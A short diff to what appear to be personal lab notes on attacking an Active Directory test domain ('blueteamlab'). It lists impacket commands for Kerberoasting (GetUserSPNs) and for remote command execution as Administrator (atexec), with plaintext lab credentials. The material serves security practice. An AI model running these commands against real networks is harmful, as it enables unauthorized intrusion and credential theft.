@@ -42,3 +42,7 @@ GetUserSPN de la suite impacket
 GetNPUsers de la suite impacket 
 - impacket-GetUserSPNs blueteamlab.local/Juliette:Password1 -dc-ip 192.168.56.102 -request
 
+ATExec tool to execute a command remotely
+- impacket-atexec blueteamlab.local/Administrateur:#@4458654##Tete@192.168.56.30 "tasklist"
+- impacket-atexec blueteamlab.local/Administrateur:#@4458654##Tete@192.168.56.30 "ipconfig"
+- impacket-atexec blueteamlab.local/Administrateur:#@4458654##Tete@192.168.56.30 "whoami"
